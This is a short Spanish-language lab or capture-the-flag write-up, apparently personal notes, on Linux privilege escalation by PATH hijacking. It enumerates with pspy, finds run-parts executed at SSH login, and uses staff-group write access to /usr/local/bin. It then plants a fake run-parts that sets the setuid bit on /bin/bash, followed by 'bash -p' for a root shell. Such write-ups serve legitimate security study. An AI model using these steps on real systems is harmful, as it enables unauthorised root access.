**Path hijacking** es una técnica en la que un atacante aprovecha la forma en que el sistema busca ejecutables en las carpetas definidas por la variable de entorno `PATH`. Al colocar un binario malicioso con el mismo nombre que uno legítimo en un directorio que aparece **antes** de la ruta original, el sistema ejecutará primero la versión del atacante.



# Enumeracion
Con [[PSPY]] vemos ejecución automática de `run-parts` cuando hacemos una conexion por ssh

![[Writeup9.png]]

Verificamos ubicación:

```bash
which run-parts
```

Confirmamos que `/usr/local/bin` está antes en `PATH`.

![[Writeup10.png]]

Vemos que estamos en el grupo `staff` que nos permite modificar el directorio  `/usr/local`.

![[Writeup 11.png]]



# Explotacion

Creamos el archivo:

```bash
nano /usr/local/bin/run-parts
```

Contenido:

```bash
#!/bin/bash
chmod u+s /bin/bash
```

Permisos:

```bash
chmod +x /usr/local/bin/run-parts
```

Conectamos por SSH y ejecutamos:

```bash
bash -p
```

